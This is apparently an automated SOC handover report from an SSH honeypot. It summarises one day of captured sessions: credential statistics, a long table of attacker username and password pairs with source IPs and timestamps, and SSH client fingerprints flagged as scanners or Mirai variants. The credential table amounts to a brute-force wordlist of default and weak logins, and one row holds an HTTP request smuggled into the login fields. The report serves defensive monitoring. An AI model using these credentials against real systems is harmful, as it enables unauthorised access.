# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-24 |
| **Generated At** | 2026-09-24T19:55:24Z |
| **Shift Time** | 19:55 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **484** |
| Confirmed Threats | **451** |
| False Positives Filtered | **33** (6.8%) |
| Unique Attacker IPs | **105** |
| Countries of Origin | **30** |
| High Severity Cases | **327** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **157** |
| Malware Samples Analyzed | **5** HIGH · **22** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **369** |
| Unique Credential Pairs | **302** |
| Unique Usernames | **94** |
| Unique Passwords | **224** |
| Successful Auth Pairs | **343** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 122 |
| `345gs5662d34` | 22 |
| `oracle` | 10 |
| `admin` | 9 |
| `support` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 43 |
| `345gs5662d34` | 22 |
| `3245gs5662d34` | 22 |
| `1234` | 10 |
| `support` | 8 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 22 |
| `root` | `3245gs5662d34` | 12 |
| `support` | `support` | 8 |
| `ubnt` | `1234` | 6 |
| `admin` | `admin` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `admin` | `176.65.134.121` | 2026-09-24T12:58:39 |
| `root` | `a123456!!` | `94.41.141.36` | 2026-09-24T13:01:45 |
| `345gs5662d34` | `345gs5662d34` | `94.41.141.36` | 2026-09-24T13:01:48 |
| `root` | `3245gs5662d34` | `94.41.141.36` | 2026-09-24T13:01:49 |
| `support` | `support` | `10.0.0.73` | 2026-09-24T13:34:49 |
| `jana` | `jana` | `86.102.111.211` | 2026-09-24T13:41:42 |
| `345gs5662d34` | `345gs5662d34` | `86.102.111.211` | 2026-09-24T13:41:46 |
| `jana` | `3245gs5662d34` | `86.102.111.211` | 2026-09-24T13:41:47 |
| `pentest` | `pentest123` | `10.0.0.73` | 2026-09-24T13:52:39 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-24T13:52:45 |
| `pentest` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T13:52:52 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `64.62.156.38` | 2026-09-24T13:54:10 |
| `bing` | `bing` | `10.0.0.73` | 2026-09-24T13:57:03 |
| `bing` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T13:57:07 |
| `test` | `zxcv` | `10.0.0.73` | 2026-09-24T13:57:44 |
| `test` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T13:57:47 |
| `rose` | `rose2025` | `10.0.0.73` | 2026-09-24T13:58:51 |
| `rose` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T13:58:57 |
| `root` | `hello2024` | `10.0.0.73` | 2026-09-24T13:59:34 |
| `root` | `Computer` | `10.0.0.73` | 2026-09-24T14:00:31 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T14:00:37 |
| `root` | `` | `94.154.43.69` | 2026-09-24T14:30:04 |
| `root` | `123456abc!` | `103.72.98.15` | 2026-09-24T14:45:06 |
| `345gs5662d34` | `345gs5662d34` | `103.72.98.15` | 2026-09-24T14:45:13 |
| `root` | `3245gs5662d34` | `103.72.98.15` | 2026-09-24T14:45:16 |
| `admin` | `admin` | `39.107.142.38` | 2026-09-24T14:57:06 |
| `adil` | `123456` | `10.0.0.73` | 2026-09-24T15:18:27 |
| `adil` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T15:18:38 |
| `root` | `server123!` | `10.0.0.73` | 2026-09-24T15:19:36 |
| `ubnt` | `1234` | `77.90.185.17` | 2026-09-24T15:24:24 |
| `ubnt` | `1234` | `10.0.0.73` | 2026-09-24T15:27:29 |
| `root` | `Root12#$` | `5.165.19.3` | 2026-09-24T15:34:28 |
| `345gs5662d34` | `345gs5662d34` | `5.165.19.3` | 2026-09-24T15:34:31 |
| `root` | `3245gs5662d34` | `5.165.19.3` | 2026-09-24T15:34:32 |
| `root` | `!@#qweasdzxc` | `103.48.192.48` | 2026-09-24T15:58:31 |
| `345gs5662d34` | `345gs5662d34` | `103.48.192.48` | 2026-09-24T15:58:36 |
| `root` | `3245gs5662d34` | `103.48.192.48` | 2026-09-24T15:58:38 |
| `admin` | `admin` | `39.109.116.214` | 2026-09-24T16:01:52 |
| `admin` | `admin` | `130.12.180.51` | 2026-09-24T16:01:53 |
| `estest` | `estest` | `50.6.22.225` | 2026-09-24T16:14:18 |
| `345gs5662d34` | `345gs5662d34` | `50.6.22.225` | 2026-09-24T16:14:20 |
| `estest` | `3245gs5662d34` | `50.6.22.225` | 2026-09-24T16:14:20 |
| `support` | `support` | `176.53.159.196` | 2026-09-24T16:17:53 |
| `root` | `ethan` | `34.14.122.221` | 2026-09-24T16:19:14 |
| `root` | `123456789abc` | `201.17.133.138` | 2026-09-24T16:19:16 |
| `345gs5662d34` | `345gs5662d34` | `34.14.122.221` | 2026-09-24T16:19:17 |
| `root` | `3245gs5662d34` | `34.14.122.221` | 2026-09-24T16:19:18 |
| `345gs5662d34` | `345gs5662d34` | `201.17.133.138` | 2026-09-24T16:19:19 |
| `root` | `3245gs5662d34` | `201.17.133.138` | 2026-09-24T16:19:20 |
| `pawel` | `pawel` | `41.242.115.83` | 2026-09-24T16:20:32 |
| `345gs5662d34` | `345gs5662d34` | `41.242.115.83` | 2026-09-24T16:20:36 |
| `pawel` | `3245gs5662d34` | `41.242.115.83` | 2026-09-24T16:20:37 |
| `root` | `qwer.123` | `218.78.64.229` | 2026-09-24T16:27:02 |
| `root` | `!Q2w3e4r` | `185.112.33.84` | 2026-09-24T16:31:24 |
| `pi` | `raspberry` | `185.112.33.84` | 2026-09-24T16:31:25 |
| `hive` | `hive` | `185.112.33.84` | 2026-09-24T16:31:26 |
| `git` | `git` | `185.112.33.84` | 2026-09-24T16:31:27 |
| `wang` | `wang123` | `185.112.33.84` | 2026-09-24T16:31:27 |
| `nginx` | `nginx` | `185.112.33.84` | 2026-09-24T16:31:28 |
| `mongo` | `123456` | `185.112.33.84` | 2026-09-24T16:31:30 |
| `user` | `111111` | `185.112.33.84` | 2026-09-24T16:31:30 |
| `oracle` | `oracle` | `185.112.33.84` | 2026-09-24T16:31:31 |
| `gpadmin` | `gpadmin123` | `185.112.33.84` | 2026-09-24T16:31:32 |
| `esroot` | `esroot` | `185.112.33.84` | 2026-09-24T16:31:34 |
| `root` | `aA123456` | `185.112.33.84` | 2026-09-24T16:31:34 |
| `gitlab` | `gitlab` | `185.112.33.84` | 2026-09-24T16:31:34 |
| `apache` | `apache123` | `185.112.33.84` | 2026-09-24T16:31:35 |
| `root` | `P@ssw0rd` | `185.112.33.84` | 2026-09-24T16:31:37 |
| `root` | `!qaz@WSX` | `185.112.33.84` | 2026-09-24T16:31:38 |
| `user` | `user` | `185.112.33.84` | 2026-09-24T16:31:38 |
| `lighthouse` | `123456` | `185.112.33.84` | 2026-09-24T16:31:38 |
| `flask` | `12345678` | `185.112.33.84` | 2026-09-24T16:31:39 |
| `user1` | `user1` | `185.112.33.84` | 2026-09-24T16:31:41 |
| `hadoop` | `hadoop` | `185.112.33.84` | 2026-09-24T16:31:41 |
| `oracle` | `!QAZ@WSX` | `185.112.33.84` | 2026-09-24T16:31:42 |
| `test` | `1234qwer` | `185.112.33.84` | 2026-09-24T16:31:42 |
| `developer` | `123456` | `185.112.33.84` | 2026-09-24T16:31:43 |
| `root` | `Aa123456` | `185.112.33.84` | 2026-09-24T16:31:43 |
| `root` | `abc123` | `185.112.33.84` | 2026-09-24T16:31:44 |
| `mysql` | `123456` | `185.112.33.84` | 2026-09-24T16:31:46 |
| `root` | `p@ssword` | `185.112.33.84` | 2026-09-24T16:31:47 |
| `tom` | `123456` | `185.112.33.84` | 2026-09-24T16:31:47 |
| `oscar` | `oscar123` | `185.112.33.84` | 2026-09-24T16:31:48 |
| `root` | `Ab123456` | `185.112.33.84` | 2026-09-24T16:31:49 |
| `root` | `1qaz@wsx` | `185.112.33.84` | 2026-09-24T16:31:50 |
| `user1` | `123456` | `185.112.33.84` | 2026-09-24T16:31:51 |
| `root` | `P@ssword` | `185.112.33.84` | 2026-09-24T16:31:51 |
| `root` | `qQ123456` | `185.112.33.84` | 2026-09-24T16:31:52 |
| `flink` | `flink` | `185.112.33.84` | 2026-09-24T16:31:52 |
| `apache` | `apache` | `185.112.33.84` | 2026-09-24T16:31:53 |
| `root` | `password` | `185.112.33.84` | 2026-09-24T16:31:55 |
| `nginx` | `nginx123` | `185.112.33.84` | 2026-09-24T16:31:55 |
| `esuser` | `123456` | `185.112.33.84` | 2026-09-24T16:31:55 |
| `root` | `Pa$$w0rd` | `185.112.33.84` | 2026-09-24T16:31:56 |
| `git` | `123456` | `185.112.33.84` | 2026-09-24T16:31:57 |
| `postgres` | `123` | `185.112.33.84` | 2026-09-24T16:31:58 |
| `svnuser` | `123456` | `185.112.33.84` | 2026-09-24T16:31:59 |
| `dolphinscheduler` | `123456` | `185.112.33.84` | 2026-09-24T16:31:59 |
| `plexserver` | `plexserver` | `185.112.33.84` | 2026-09-24T16:32:00 |
| `root` | `4r3e2w1q` | `185.112.33.84` | 2026-09-24T16:32:01 |
| `sonar` | `sonar123` | `185.112.33.84` | 2026-09-24T16:32:03 |
| `app` | `app123` | `185.112.33.84` | 2026-09-24T16:32:03 |
| `lighthouse` | `lighthouse123` | `185.112.33.84` | 2026-09-24T16:32:03 |
| `tools` | `tools` | `185.112.33.84` | 2026-09-24T16:32:03 |
| `mysql` | `mysql123` | `185.112.33.84` | 2026-09-24T16:32:04 |
| `gpadmin` | `gpadmin` | `185.112.33.84` | 2026-09-24T16:32:05 |
| `root` | `admin` | `185.112.33.84` | 2026-09-24T16:32:05 |
| `root` | `1` | `185.112.33.84` | 2026-09-24T16:32:08 |
| `oracle` | `qwe123` | `185.112.33.84` | 2026-09-24T16:32:09 |
| `www` | `abc123` | `185.112.33.84` | 2026-09-24T16:32:10 |
| `root` | `qwerty123` | `185.112.33.84` | 2026-09-24T16:32:10 |
| `oscar` | `oscar` | `185.112.33.84` | 2026-09-24T16:32:10 |
| `test` | `abc123` | `185.112.33.84` | 2026-09-24T16:32:10 |
| `admin` | `123456` | `185.112.33.84` | 2026-09-24T16:32:10 |
| `root` | `1Q2w3e4r` | `185.112.33.84` | 2026-09-24T16:32:12 |
| `app` | `app123456` | `185.112.33.84` | 2026-09-24T16:32:14 |
| `elastic` | `elastic123` | `185.112.33.84` | 2026-09-24T16:32:15 |
| `root` | `p@ssw0rd` | `185.112.33.84` | 2026-09-24T16:32:15 |
| `guest` | `abc123` | `185.112.33.84` | 2026-09-24T16:32:16 |
| `tom` | `tom123` | `185.112.33.84` | 2026-09-24T16:32:17 |
| `sonar` | `123456` | `185.112.33.84` | 2026-09-24T16:32:17 |
| `root` | `1234` | `185.112.33.84` | 2026-09-24T16:32:17 |
| `jumpserver` | `jumpserver` | `185.112.33.84` | 2026-09-24T16:32:17 |
| `git` | `git123` | `185.112.33.84` | 2026-09-24T16:32:20 |
| `ranger` | `ranger123` | `185.112.33.84` | 2026-09-24T16:32:21 |
| `root` | `1Q2W3E4R` | `185.112.33.84` | 2026-09-24T16:32:22 |
| `tom` | `tom` | `185.112.33.84` | 2026-09-24T16:32:22 |
| `appuser` | `appuser` | `185.112.33.84` | 2026-09-24T16:32:22 |
| `ubuntu` | `ubuntu` | `185.112.33.84` | 2026-09-24T16:32:23 |
| `root` | `Qq123456` | `185.112.33.84` | 2026-09-24T16:32:24 |
| `elsearch` | `elsearch` | `185.112.33.84` | 2026-09-24T16:32:26 |
| `nginx` | `123456` | `185.112.33.84` | 2026-09-24T16:32:27 |
| `rancher` | `rancher123` | `185.112.33.84` | 2026-09-24T16:32:27 |
| `root` | `passw0rd` | `185.112.33.84` | 2026-09-24T16:32:27 |
| `user` | `123` | `185.112.33.84` | 2026-09-24T16:32:29 |
| `rancher` | `rancher` | `185.112.33.84` | 2026-09-24T16:32:29 |
| `es` | `123456` | `185.112.33.84` | 2026-09-24T16:32:30 |
| `uftp` | `uftp123` | `185.112.33.84` | 2026-09-24T16:32:30 |
| `data` | `data` | `185.112.33.84` | 2026-09-24T16:32:31 |
| `root` | `1qaz2wsx` | `185.112.33.84` | 2026-09-24T16:32:31 |
| `bigdata` | `bigdata` | `185.112.33.84` | 2026-09-24T16:32:33 |
| `oracle` | `!QAZ@wsx` | `185.112.33.84` | 2026-09-24T16:32:34 |
| `steam` | `123456` | `185.112.33.84` | 2026-09-24T16:32:36 |
| `plex` | `plex` | `185.112.33.84` | 2026-09-24T16:32:36 |
| `esuser` | `esuser` | `185.112.33.84` | 2026-09-24T16:32:36 |
| `docker` | `docker` | `185.112.33.84` | 2026-09-24T16:32:36 |
| `observer` | `observer` | `185.112.33.84` | 2026-09-24T16:32:36 |
| `elastic` | `elastic` | `185.112.33.84` | 2026-09-24T16:32:39 |
| `user` | `1` | `185.112.33.84` | 2026-09-24T16:32:39 |
| `oracle` | `password` | `185.112.33.84` | 2026-09-24T16:32:40 |
| `ts` | `ts` | `185.112.33.84` | 2026-09-24T16:32:42 |
| `root` | `Qwerty` | `185.112.33.84` | 2026-09-24T16:32:42 |
| `postgres` | `postgres123` | `185.112.33.84` | 2026-09-24T16:32:42 |
| `ftpuser` | `abc123` | `185.112.33.84` | 2026-09-24T16:32:42 |
| `test` | `test` | `185.112.33.84` | 2026-09-24T16:32:42 |
| `guest` | `guest` | `185.112.33.84` | 2026-09-24T16:32:44 |
| `gitlab` | `123456` | `185.112.33.84` | 2026-09-24T16:32:44 |
| `worker` | `worker` | `185.112.33.84` | 2026-09-24T16:32:48 |
| `gpuadmin` | `gpuadmin` | `185.112.33.84` | 2026-09-24T16:32:48 |
| `flask` | `flask` | `185.112.33.84` | 2026-09-24T16:32:48 |
| `root` | `4e2q1w3r` | `185.112.33.84` | 2026-09-24T16:32:48 |
| `zabbix` | `123456` | `185.112.33.84` | 2026-09-24T16:32:48 |
| `flask` | `flask123` | `185.112.33.84` | 2026-09-24T16:32:50 |
| `testuser` | `testuser` | `185.112.33.84` | 2026-09-24T16:32:51 |
| `gitlab` | `12345678` | `185.112.33.84` | 2026-09-24T16:32:51 |
| `root` | `root123` | `185.112.33.84` | 2026-09-24T16:32:52 |
| `weblogic` | `weblogic` | `185.112.33.84` | 2026-09-24T16:32:54 |
| `jenkins` | `jenkins` | `185.112.33.84` | 2026-09-24T16:32:54 |
| `admin` | `admin123` | `185.112.33.84` | 2026-09-24T16:32:54 |
| `postgres` | `postgres` | `185.112.33.84` | 2026-09-24T16:32:54 |
| `centos` | `123456` | `185.112.33.84` | 2026-09-24T16:32:55 |
| `steam` | `steam` | `185.112.33.84` | 2026-09-24T16:32:57 |
| `test` | `test123` | `185.112.33.84` | 2026-09-24T16:32:59 |
| `test` | `123456` | `185.112.33.84` | 2026-09-24T16:32:59 |
| `root` | `!Q@W3e4r` | `185.112.33.84` | 2026-09-24T16:32:59 |
| `centos` | `centos` | `185.112.33.84` | 2026-09-24T16:32:59 |
| `tomcat` | `tomcat123` | `185.112.33.84` | 2026-09-24T16:33:00 |
| `mysql` | `mysql` | `185.112.33.84` | 2026-09-24T16:33:02 |
| `root` | `P@55w0rd` | `185.112.33.84` | 2026-09-24T16:33:02 |
| `root` | `1234567890` | `185.112.33.84` | 2026-09-24T16:33:02 |
| `zabbix` | `zabbix` | `185.112.33.84` | 2026-09-24T16:33:04 |
| `observer` | `observer123` | `185.112.33.84` | 2026-09-24T16:33:06 |
| `hadoop` | `123` | `185.112.33.84` | 2026-09-24T16:33:06 |
| `kubernetes` | `kubernetes` | `185.112.33.84` | 2026-09-24T16:33:06 |
| `bot` | `bot` | `185.112.33.84` | 2026-09-24T16:33:08 |
| `oracle` | `abc123` | `185.112.33.84` | 2026-09-24T16:33:09 |
| `debianuser` | `1qazXSW@` | `185.112.33.84` | 2026-09-24T16:33:09 |
| `ftp` | `ftp123` | `185.112.33.84` | 2026-09-24T16:33:09 |
| `ranger` | `ranger` | `185.112.33.84` | 2026-09-24T16:33:09 |
| `root` | `!QAZ2wsx` | `185.112.33.84` | 2026-09-24T16:33:12 |
| `admin` | `admin` | `185.112.33.84` | 2026-09-24T16:33:12 |
| `elastic` | `123456` | `185.112.33.84` | 2026-09-24T16:33:12 |
| `tomcat` | `tomcat` | `185.112.33.84` | 2026-09-24T16:33:13 |
| `default` | `1` | `185.112.33.84` | 2026-09-24T16:33:13 |
| `root` | `!Qaz@Wsx` | `185.112.33.84` | 2026-09-24T16:33:14 |
| `hadoop` | `123456` | `185.112.33.84` | 2026-09-24T16:33:15 |
| `gitlab` | `gitlab123` | `185.112.33.84` | 2026-09-24T16:33:17 |
| `admin` | `1234` | `185.112.33.84` | 2026-09-24T16:33:17 |
| `tools` | `tools123` | `185.112.33.84` | 2026-09-24T16:33:18 |
| `root` | `12345` | `185.112.33.84` | 2026-09-24T16:33:20 |
| `root` | `QWERTY123` | `185.112.33.84` | 2026-09-24T16:33:20 |
| `www` | `www` | `185.112.33.84` | 2026-09-24T16:33:20 |
| `es` | `123` | `185.112.33.84` | 2026-09-24T16:33:20 |
| `oracle` | `1qaz@WSX` | `185.112.33.84` | 2026-09-24T16:33:21 |
| `root` | `Password1` | `185.112.33.84` | 2026-09-24T16:33:22 |
| `uftp` | `uftp` | `185.112.33.84` | 2026-09-24T16:33:22 |
| `flink` | `flink123` | `185.112.33.84` | 2026-09-24T16:33:23 |
| `gitlab-runner` | `gitlab-runner` | `185.112.33.84` | 2026-09-24T16:33:26 |
| `oracle` | `123456` | `185.112.33.84` | 2026-09-24T16:33:26 |
| `es` | `es123456` | `185.112.33.84` | 2026-09-24T16:33:26 |
| `ubnt` | `ubnt` | `185.112.33.84` | 2026-09-24T16:33:27 |
| `root` | `AA123456` | `185.112.33.84` | 2026-09-24T16:33:28 |
| `nvidia` | `nvidia123` | `185.112.33.84` | 2026-09-24T16:33:29 |
| `ftp` | `123456` | `185.112.33.84` | 2026-09-24T16:33:29 |
| `developer` | `developer` | `185.112.33.84` | 2026-09-24T16:33:29 |
| `root` | `!QAZ@WSX` | `185.112.33.84` | 2026-09-24T16:33:29 |
| `root` | `Passw0rd` | `185.112.33.84` | 2026-09-24T16:33:31 |
| `app` | `123456` | `185.112.33.84` | 2026-09-24T16:33:33 |
| `mongodb` | `123456` | `185.112.33.84` | 2026-09-24T16:33:34 |
| `mongodb` | `mongodb` | `185.112.33.84` | 2026-09-24T16:33:34 |
| `root` | `Password` | `185.112.33.84` | 2026-09-24T16:33:35 |
| `www` | `123456` | `185.112.33.84` | 2026-09-24T16:33:35 |
| `docker` | `docker123` | `185.112.33.84` | 2026-09-24T16:33:35 |
| `sonar` | `sonar` | `185.112.33.84` | 2026-09-24T16:33:36 |
| `elasticsearch` | `elasticsearch` | `185.112.33.84` | 2026-09-24T16:33:36 |
| `root` | `123` | `185.112.33.84` | 2026-09-24T16:33:38 |
| `guest` | `guest123` | `185.112.33.84` | 2026-09-24T16:33:39 |
| `postgres` | `123456` | `185.112.33.84` | 2026-09-24T16:33:40 |
| `dev` | `dev123456` | `185.112.33.84` | 2026-09-24T16:33:40 |
| `tomcat` | `123456` | `185.112.33.84` | 2026-09-24T16:33:41 |
| `vagrant` | `vagrant` | `185.112.33.84` | 2026-09-24T16:33:41 |
| `git` | `123` | `185.112.33.84` | 2026-09-24T16:33:42 |
| `elsearch` | `123456` | `185.112.33.84` | 2026-09-24T16:33:42 |
| `esuser` | `esuser123` | `185.112.33.84` | 2026-09-24T16:33:44 |
| `esuser` | `123` | `185.112.33.84` | 2026-09-24T16:33:45 |
| `ftpuser` | `ftpuser` | `185.112.33.84` | 2026-09-24T16:33:45 |
| `root` | `123321` | `185.112.33.84` | 2026-09-24T16:33:48 |
| `ftpuser` | `ftpuser123` | `185.112.33.84` | 2026-09-24T16:33:48 |
| `worker` | `worker123` | `185.112.33.84` | 2026-09-24T16:33:48 |
| `admin` | `password` | `185.112.33.84` | 2026-09-24T16:33:49 |
| `steam` | `steam123` | `185.112.33.84` | 2026-09-24T16:33:50 |
| `root` | `1qaz@WSX` | `185.112.33.84` | 2026-09-24T16:33:51 |
| `demo` | `demo` | `185.112.33.84` | 2026-09-24T16:33:52 |
| `es` | `es` | `185.112.33.84` | 2026-09-24T16:33:52 |
| `dev` | `123456` | `185.112.33.84` | 2026-09-24T16:33:52 |
| `deploy` | `deploy` | `185.112.33.84` | 2026-09-24T16:33:52 |
| `deploy` | `123456` | `185.112.33.84` | 2026-09-24T16:33:52 |
| `oscar` | `123456` | `185.112.33.84` | 2026-09-24T16:33:55 |
| `dev` | `dev` | `185.112.33.84` | 2026-09-24T16:33:55 |
| `dolphinscheduler` | `dolphinscheduler123` | `185.112.33.84` | 2026-09-24T16:33:55 |
| `pi` | `pi` | `185.112.33.84` | 2026-09-24T16:33:55 |
| `root` | `aB123456` | `185.112.33.84` | 2026-09-24T16:34:00 |
| `oceanbase` | `oceanbase` | `185.112.33.84` | 2026-09-24T16:34:00 |
| `lighthouse` | `lighthouse` | `185.112.33.84` | 2026-09-24T16:34:00 |
| `root` | `a123456A` | `185.112.33.84` | 2026-09-24T16:34:00 |
| `root` | `Admin@123` | `185.112.33.84` | 2026-09-24T16:34:00 |
| `ftpuser` | `123456` | `185.112.33.84` | 2026-09-24T16:34:03 |
| `user` | `123456` | `185.112.33.84` | 2026-09-24T16:34:03 |
| `svnuser` | `svnuser` | `185.112.33.84` | 2026-09-24T16:34:03 |
| `root` | `qq123456` | `185.112.33.84` | 2026-09-24T16:34:03 |
| `root` | `1qazXSW@` | `185.112.33.84` | 2026-09-24T16:34:04 |
| `ubuntu` | `123456` | `185.112.33.84` | 2026-09-24T16:34:04 |
| `root` | `QQ123456` | `185.112.33.84` | 2026-09-24T16:34:06 |
| `esadmin` | `esadmin` | `185.112.33.84` | 2026-09-24T16:34:07 |
| `root` | `1qazxsw2` | `185.112.33.84` | 2026-09-24T16:34:08 |
| `flask` | `123456` | `185.112.33.84` | 2026-09-24T16:34:08 |
| `deploy` | `deploy123` | `185.112.33.84` | 2026-09-24T16:34:09 |
| `root` | `toor` | `185.112.33.84` | 2026-09-24T16:34:10 |
| `root` | `aa123456` | `185.112.33.84` | 2026-09-24T16:34:12 |
| `oracle` | `123qwe` | `185.112.33.84` | 2026-09-24T16:34:12 |
| `rabbitmq` | `rabbitmq` | `185.112.33.84` | 2026-09-24T16:34:12 |
| `root` | `qwerty` | `185.112.33.84` | 2026-09-24T16:34:12 |
| `root` | `111111` | `185.112.33.84` | 2026-09-24T16:34:13 |
| `root` | `1q2w3e4r` | `185.112.33.84` | 2026-09-24T16:34:13 |
| `root` | `root@123` | `185.112.33.84` | 2026-09-24T16:34:13 |
| `hadoop` | `hadoop123` | `185.112.33.84` | 2026-09-24T16:34:14 |
| `root` | `A123456a` | `185.112.33.84` | 2026-09-24T16:34:19 |
| `wang` | `123456` | `185.112.33.84` | 2026-09-24T16:34:19 |
| `ftp` | `ftp` | `185.112.33.84` | 2026-09-24T16:34:19 |
| `elasticsearch` | `123456` | `185.112.33.84` | 2026-09-24T16:34:19 |
| `uftp` | `123456` | `185.112.33.84` | 2026-09-24T16:34:19 |
| `awsgui` | `awsgui` | `185.112.33.84` | 2026-09-24T16:34:20 |
| `dolphinscheduler` | `dolphinscheduler` | `185.112.33.84` | 2026-09-24T16:34:22 |
| `root` | `passwd` | `185.112.33.84` | 2026-09-24T16:34:22 |
| `yarn` | `yarn` | `185.112.33.84` | 2026-09-24T16:34:22 |
| `oracle` | `oracle123` | `185.112.33.84` | 2026-09-24T16:34:23 |
| `test2` | `test2` | `185.112.33.84` | 2026-09-24T16:34:24 |
| `guest` | `123456` | `185.112.33.84` | 2026-09-24T16:34:24 |
| `wang` | `wang` | `185.112.33.84` | 2026-09-24T16:34:29 |
| `root` | `Ac123456` | `185.112.33.84` | 2026-09-24T16:34:29 |
| `nexus` | `nexus` | `185.112.33.84` | 2026-09-24T16:34:29 |
| `app` | `app` | `185.112.33.84` | 2026-09-24T16:34:29 |
| `www` | `www123` | `185.112.33.84` | 2026-09-24T16:34:29 |
| `root` | `123456789` | `185.112.33.84` | 2026-09-24T16:34:30 |
| `nvidia` | `nvidia` | `185.112.33.84` | 2026-09-24T16:34:32 |
| `es` | `es123` | `185.112.33.84` | 2026-09-24T16:34:32 |
| `sugi` | `sugi` | `185.112.33.84` | 2026-09-24T16:34:32 |
| `root` | `rootroot` | `185.112.33.84` | 2026-09-24T16:34:32 |
| `root` | `111111` | `92.118.39.50` | 2026-09-24T16:58:05 |
| `root` | `123` | `92.118.39.50` | 2026-09-24T17:00:21 |
| `root` | `123123` | `92.118.39.50` | 2026-09-24T17:02:37 |
| `root` | `123321` | `92.118.39.50` | 2026-09-24T17:04:47 |
| `root` | `1234` | `92.118.39.50` | 2026-09-24T17:06:56 |
| `root` | `12345` | `92.118.39.50` | 2026-09-24T17:08:58 |
| `root` | `1234567` | `92.118.39.50` | 2026-09-24T17:13:02 |
| `root` | `12345678` | `92.118.39.50` | 2026-09-24T17:14:55 |
| `root` | `123456789` | `92.118.39.50` | 2026-09-24T17:16:39 |
| `root` | `1234abcd` | `92.118.39.50` | 2026-09-24T17:18:32 |
| `root` | `123abc` | `92.118.39.50` | 2026-09-24T17:20:30 |
| `root` | `123qwe` | `92.118.39.50` | 2026-09-24T17:22:27 |
| `root` | `1q2w3e` | `92.118.39.50` | 2026-09-24T17:24:18 |
| `root` | `1q2w3e4r` | `92.118.39.50` | 2026-09-24T17:26:11 |
| `root` | `1qaz2wsx` | `92.118.39.50` | 2026-09-24T17:28:05 |
| `root` | `654321` | `92.118.39.50` | 2026-09-24T17:29:57 |
| `root` | `P@ssw0rd` | `92.118.39.50` | 2026-09-24T17:31:38 |
| `root` | `Support@2024` | `186.68.83.104` | 2026-09-24T17:33:18 |
| `345gs5662d34` | `345gs5662d34` | `186.68.83.104` | 2026-09-24T17:33:20 |
| `root` | `3245gs5662d34` | `186.68.83.104` | 2026-09-24T17:33:21 |
| `root` | `P@ssword` | `92.118.39.50` | 2026-09-24T17:33:30 |
| `root` | `abC123456` | `43.134.85.158` | 2026-09-24T17:33:36 |
| `345gs5662d34` | `345gs5662d34` | `43.134.85.158` | 2026-09-24T17:33:40 |
| `root` | `3245gs5662d34` | `43.134.85.158` | 2026-09-24T17:33:42 |
| `root` | `cw@123456` | `200.219.200.16` | 2026-09-24T17:34:24 |
| `345gs5662d34` | `345gs5662d34` | `200.219.200.16` | 2026-09-24T17:34:27 |
| `root` | `3245gs5662d34` | `200.219.200.16` | 2026-09-24T17:34:28 |
| `root` | `Root123` | `92.118.39.50` | 2026-09-24T17:35:15 |
| `root` | `admin` | `92.118.39.50` | 2026-09-24T17:36:58 |
| `root` | `admin123` | `92.118.39.50` | 2026-09-24T17:38:56 |
| `root` | `Qq101010` | `10.0.0.73` | 2026-09-24T17:39:54 |
| `root` | `letmein` | `92.118.39.50` | 2026-09-24T17:41:00 |
| `hafiz` | `hafiz` | `10.0.0.73` | 2026-09-24T17:42:28 |
| `hafiz` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T17:42:34 |
| `root` | `passw0rd` | `92.118.39.50` | 2026-09-24T17:43:37 |
| `root` | `password` | `92.118.39.50` | 2026-09-24T17:46:53 |
| `root` | `password1` | `92.118.39.50` | 2026-09-24T17:49:32 |
| `root` | `qwerty` | `92.118.39.50` | 2026-09-24T17:52:47 |
| `root` | `123567` | `23.227.147.163` | 2026-09-24T17:58:23 |
| `345gs5662d34` | `345gs5662d34` | `23.227.147.163` | 2026-09-24T17:58:25 |
| `root` | `3245gs5662d34` | `23.227.147.163` | 2026-09-24T17:58:25 |
| `root` | `Server@2026` | `10.0.0.73` | 2026-09-24T18:21:46 |
| `miriam` | `miriam` | `10.0.0.73` | 2026-09-24T18:37:47 |
| `miriam` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T18:37:52 |
| `mobile` | `1234` | `10.0.0.73` | 2026-09-24T18:42:07 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **484** |
| Sessions with Fingerprint | **17** |
| Unique HASSH Fingerprints | **17** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 287 |
| libssh | 47 |
| OpenSSH | 12 |
| Paramiko (Python) | 2 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 247 | 1 |
| `f555226df196...` | Mirai/variant | 45 | 19 |
| `2ec37a7cc8da...` | Mirai/variant | 27 | 1 |
| `390ffe68a68c...` | Modern SSH client | 4 | 1 |
| `4e066189c3bb...` | Generic scanner | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 247 | 1 | Generic scanner |
| `f555226df196...` | libssh | 45 | 19 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 27 | 1 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 6 | 5 | — |
| `390ffe68a68c...` | OpenSSH | 4 | 1 | Modern SSH client |
